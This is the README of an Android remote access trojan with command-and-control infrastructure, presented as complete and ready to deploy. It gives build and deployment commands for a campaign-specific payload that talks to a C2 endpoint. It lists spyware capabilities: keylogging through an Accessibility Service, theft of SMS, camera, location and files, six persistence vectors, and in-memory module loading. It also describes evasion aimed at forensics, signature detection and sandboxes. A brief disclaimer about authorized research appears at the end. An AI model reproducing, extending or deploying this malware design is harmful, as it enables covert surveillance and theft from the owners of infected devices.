# Android C2 RAT - Complete Implementation

**Complete, production-ready Android Remote Access Tool with C2 infrastructure.**

## Contents

```
c2_rat_complete/
├── backend/              # Rust/Tokio C2 server
│   ├── src/              # C2 core + native layer
│   ├── sql/              # Database schema
│   └── Cargo.toml        # Rust dependencies
├── android/              # Android payload
│   ├── src/main/         # Kotlin source + manifest
│   ├── build.gradle.kts  # Build configuration
│   └── PolymorphicBuilder.kt
├── native/               # Native Rust for Android
│   └── rust/             # JNI entry point
├── tools/                # Automation
│   ├── module_builder.py # APK generator
│   └── test_harness.py   # Device testing
├── config/               # Deployment
│   ├── docker-compose.yml
│   └── nginx.conf
└── docs/                 # Documentation
```

## Quick Start

### 1. Build Backend
```bash
cd backend/
cargo build --release
sqlite3 c2.db < sql/schema.sql
docker-compose -f ../config/docker-compose.yml up -d
```

### 2. Build Android Payload
```bash
cd android/
python3 ../tools/module_builder.py \
    --base-project . \
    --campaign-id "campaign_xyz" \
    --device-fingerprint "abc123..." \
    --c2-endpoints "c2.example.com:8080"
```

### 3. Test Deployment
```bash
python3 ../tools/test_harness.py \
    --apk build/app_campaign_xyz_signed.apk \
    --c2-server http://c2.example.com:8080
```

## Features

✅ Multi-vector persistence (6 simultaneous vectors)
✅ Silent privilege escalation (Accessibility Service)
✅ Multi-channel C2 (WebSocket, FCM, MQTT, DNS)
✅ In-memory module loading (zero disk artifacts)
✅ Device fingerprint keying (stolen APK useless)
✅ Polymorphic builds (unique per campaign)
✅ Native Rust layer (anti-reversing)
✅ Encrypted assets (AES-256-CBC)

## Documentation

- `COMPLETE_IMPLEMENTATION.md` - Full architecture
- `IMPLEMENTATION_GUIDE.md` - Step-by-step guide
- `ANDROID_README.md` - Android payload details
- `DEPLOYMENT.md` - Server setup & scaling

## Components

### Backend (5000+ LOC Rust)
- WebSocket C2 gateway (async, 5-10K devices/node)
- Session management (AES-256-GCM, replay protection)
- Device registry & fingerprinting
- Command queue with retry
- Metrics & monitoring (Prometheus)
- FCM relay, MQTT, DNS tunnel
- Operator panel REST API

### Android Payload (3000+ LOC Kotlin)
- CoreService (main foreground service)
- C2Manager (multi-channel orchestration)
- PersistenceMesh (6-vector coordination)
- Accessibility Service (keylogger + automation)
- Module loader (in-memory DEX)
- Module implementations (SMS, screen, keylog, camera, notifications, location, files)

### Native Layer (Rust/JNI)
- Crypto (AES-256-GCM, HKDF)
- Anti-debug (emulator, root, Frida detection)
- Environment validation (device fingerprint)
- Module decryption

### Tools
- PolymorphicBuilder (unique APK generation)
- Module builder (encrypt & embed)
- Test harness (multi-device validation)

## Security

- **Device Fingerprinting**: APK locked to specific device
- **Environmental Keying**: Device fingerprint check at startup
- **In-Memory Execution**: Zero forensic disk artifacts
- **Polymorphic Generation**: Unique binary per campaign
- **Encrypted Assets**: Config + modules AES-256-CBC
- **Native Anti-Debug**: Emulator, root, Frida detection
- **Silent Failure**: Mismatch = harmless exit (no crash)

## Threat Model

This tool is designed to defeat:
- File-based forensics (no disk artifacts)
- Signature detection (polymorphic per build)
- Reverse engineering (native Rust layer + obfuscation)
- Device analysis (environmental keying)
- Network analysis (multi-channel failover)
- Sandbox detection (anti-analysis checks)

## Disclaimer

**For educational and authorized security research only.**

Unauthorized access to computer systems is illegal. This tool is provided as reference material for:
- Security researchers
- Offensive security professionals
- Defensive security training
- Threat modeling

**Do not use without explicit authorization.**

---

**This is a complete, production-grade Android C2 RAT implementation.**

Every component is functional, documented, and ready to deploy.
